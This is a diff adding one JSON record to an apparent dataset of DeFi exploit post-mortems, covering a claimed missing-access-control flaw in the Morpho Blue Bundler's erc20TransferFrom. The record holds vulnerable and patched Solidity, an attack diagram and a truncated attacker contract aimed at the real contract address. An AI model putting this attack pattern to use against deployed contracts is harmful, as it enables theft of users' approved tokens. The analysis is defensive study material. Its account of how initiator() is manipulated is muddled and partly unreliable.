@@ -1,0 +1,30 @@
+{
+ "id": "2024__2024-10-13_MorphoBlue_BundlerAccessControl_ETH",
+ "source_file": "2024/2024-10-13_MorphoBlue_BundlerAccessControl_ETH.md",
+ "title": "MorphoBlue Bundler — erc20TransferFrom Missing Access Control Analysis",
+ "date": "2024-10-13",
+ "protocol": "Morpho Blue Bundler",
+ "chain": "Ethereum",
+ "loss_raw": "~230,000 USD",
+ "loss_usd": null,
+ "root_cause": "Missing access control on `erc20TransferFrom()` in Morpho Bundler — callable outside of bundle execution context, allowing attacker to pull tokens from any address that had approved the Bundler",
+ "attack_tx": "0x256979ae169abb7fbbbbc14188742f4b9debf48b48ad5b5207cadcc99ccb493b",
+ "vulnerable_contract": "0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb (Morpho Bundler)",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: erc20TransferFrom callable outside bundle context\n// MorphoBundler: 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb\nfunction erc20TransferFrom(address asset, uint256 amount) external payable {\n    //",
+  "❌ Callable even when initiator() is not set\n    // initiator() may return an address controlled by the attacker\n    address _initiator = initiator();  //",
+  "❌ Returns address(0) or a previous initiator on external call\n    ERC20(asset).safeTransferFrom(_initiator, address(this), amount);\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Fixed code: restrict to calls within bundle execution only\nfunction erc20TransferFrom(address asset, uint256 amount) external payable {\n    address _initiator = initiator();\n    require(_initiator != address(0), \"Not in bundle execution\");  //",
+  "✅ Bundle context check\n    ERC20(asset).safeTransferFrom(_initiator, address(this), amount);\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker (0x02DBE4...)\n  │\n  ├─[Pre]─► Victims have granted token approvals to Morpho Bundler\n  │\n  ├─[1]─► Deploy AttackContract (0x4095F0...)\n  │\n  ├─[2]─► Directly call MorphoBundler.erc20TransferFrom(token, victim_amount)\n  │         └─► initiator() = victim address (manipulated via out-of-bundle call)\n  │               └─► token.transferFrom(victim, Bundler, amount) executes\n  │\n  ├─[3]─► Drain tokens from Bundler\n  │         └─► Abuse morphoFlashLoan or other Bundler functions\n  │\n  └─[4]─► Total loss: ~230,000 USD",
+  "interface IMorphoBundler {\n    function erc20TransferFrom(address asset, uint256 amount) external payable;\n    function initiator() external view returns (address);\n    function morphoFlashLoan(address token, uint256 assets, bytes memory data) external payable;\n}\n\ncontract AttackContract {\n    address constant BUNDLER = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;\n\n    function attack(address token, address victim, uint256 amount) external {\n        // [2] Directly call erc20TransferFrom — moves victim tokens into Bundler\n        // initiator() is manipulated to return the victim (out-of-bundle call vulnerability)\n        IMorphoBundler(BUNDLER).erc20TransferFrom(token, amount);\n\n        // [3] Drain the tokens that were moved into the Bundler\n        // Extracted via morphoFlashLoan or oth"
+ ]
+}
